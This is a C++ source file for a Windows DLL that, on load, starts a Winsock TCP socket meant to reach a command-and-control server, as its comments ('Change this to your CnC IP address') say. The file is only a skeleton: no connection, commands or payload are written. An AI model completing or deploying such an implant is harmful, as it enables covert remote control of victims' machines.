#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <iostream>
#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>

void DebugMode();
void Main();

#define IP_ADDR "127.0.0.1" // Change this to your CnC IP address
#define PORT 5000 // Change this to your CnC Port

BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpvReserved) {
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
#ifndef NDEBUG
		DebugMode();
#endif
		Main();
		break;
	}
	return TRUE;
}

void Main() {
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		std::cout << "[ERROR] Error initializing our socket" << std::endl;;
		throw std::exception();
		return;
	}

	
}

void DebugMode() {
	FILE* f;
	AllocConsole();
	freopen_s(&f, "CONOUT$", "w", stdout);
	return;
}